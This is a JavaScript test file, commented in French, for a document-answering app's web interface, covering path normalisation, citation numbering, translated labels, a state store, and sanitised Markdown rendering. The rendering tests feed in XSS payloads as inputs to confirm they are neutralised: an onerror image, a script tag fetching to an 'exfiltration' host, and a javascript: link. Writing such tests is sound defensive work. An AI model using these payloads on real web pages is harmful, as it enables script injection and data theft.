// Tests du rendu sûr et des utilitaires d'interface (exécutés par Node).
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const here = path.dirname(fileURLToPath(import.meta.url));
const web = path.join(here, '..', '..', 'src', 'archipelle', 'ui', 'web');

// La fenêtre est simulée par jsdom, puis les bibliothèques RÉELLEMENT LIVRÉES
// (ui/web/vendor) y sont exécutées : les tests portent sur ce qui sera embarqué.
const { JSDOM } = await import('jsdom');
const dom = new JSDOM('<!doctype html><body></body>', { runScripts: 'outside-only' });
dom.window.eval(readFileSync(path.join(web, 'vendor', 'markdown-it.min.js'), 'utf8'));
dom.window.eval(readFileSync(path.join(web, 'vendor', 'purify.min.js'), 'utf8'));
globalThis.window = dom.window;
globalThis.document = dom.window.document;

const render = await import(path.join(web, 'js', 'render.js'));
const i18n = await import(path.join(web, 'js', 'i18n.js'));
const store = await import(path.join(web, 'js', 'store.js'));

test('les chemins cités sont normalisés', () => {
  assert.equal(render.normalizePath('./dossier//fichier.pdf'), 'dossier/fichier.pdf');
  assert.equal(render.normalizePath('bureau\\budget.xlsx'), 'bureau/budget.xlsx');
  assert.equal(render.normalizePath('  /a/b.txt/  '), 'a/b.txt');
});

test('les marqueurs deviennent des références numérotées', () => {
  const sources = [{ path: 'notes.txt' }, { path: 'bail.pdf' }];
  const out = render.replaceCitations('Voir [[bail.pdf]] et [[notes.txt]].', sources);
  assert.match(out, /\[2\]/);
  assert.match(out, /\[1\]/);
  assert.doesNotMatch(out, /\[\[/);
});

test('une citation inconnue reçoit un numéro à la suite', () => {
  const out = render.replaceCitations('[[inconnu.pdf]]', [{ path: 'a.txt' }]);
  assert.match(out, /\[2\]/);
});

test('le HTML contenu dans une réponse est affiché comme du texte inerte', () => {
  const html = render.renderAnswer('<img src=x onerror="alert(1)"> **gras**');
  assert.doesNotMatch(html, /<img/);        // aucune balise réelle n'est créée
  assert.match(html, /&lt;img/);            // le texte reste visible, échappé
  assert.match(html, /<strong>gras<\/strong>/);  // le Markdown, lui, fonctionne
});

test('une balise script issue d’un document est supprimée', () => {
  const html = render.renderAnswer('Texte <script>fetch("http://exfiltration")</script> fin');
  assert.doesNotMatch(html, /<script/);
  assert.doesNotMatch(html, /exfiltration<\/script>/);
});

test('aucun lien javascript: n’est créé', () => {
  const html = render.renderAnswer('[clic](javascript:alert(1))');
  assert.doesNotMatch(html, /<a[^>]*javascript:/);  // markdown-it refuse cette adresse
  const normal = render.renderAnswer('[site](https://exemple.fr)');
  assert.match(normal, /<a href="https:\/\/exemple\.fr"/);  // les liens normaux restent,
});                                                          // mais le clic est intercepté

test('les tableaux Markdown sont rendus', () => {
  const html = render.renderAnswer('| a | b |\n|---|---|\n| 1 | 2 |');
  assert.match(html, /<table>/);
});

test('les libellés manquants retombent sur leur clé', () => {
  i18n.install({ 'ui.a': 'Bonjour {name}' });
  assert.equal(i18n.t('ui.a', { name: 'Zoé' }), 'Bonjour Zoé');
  assert.equal(i18n.t('ui.a'), 'Bonjour {name}');
  assert.equal(i18n.t('ui.absent'), 'ui.absent');
});

test('les tailles sont affichées en français', () => {
  i18n.install({ 'units.bytes': '{value} o', 'units.kb': '{value} Ko', 'units.mb': '{value} Mo' });
  assert.equal(i18n.formatBytes(512), '512 o');
  assert.equal(i18n.formatBytes(1536), '1,5 Ko');
});

test('les contrôles sont verrouillés seulement dans la conversation traitée', () => {
  store.update({ conversation: { id: 'c1' }, run: { run_id: 'r1', conversation_id: 'c1' } });
  assert.equal(store.isBusy(), true);
  assert.equal(store.isBusy('c2'), false);
  store.update({ run: null });
  assert.equal(store.isBusy(), false);
});

test('les abonnés sont prévenus à chaque changement', () => {
  const seen = [];
  const stop = store.subscribe((s) => seen.push(s.search));
  store.update({ search: 'loyer' });
  stop();
  store.update({ search: 'autre' });
  assert.deepEqual(seen, ['loyer']);
});
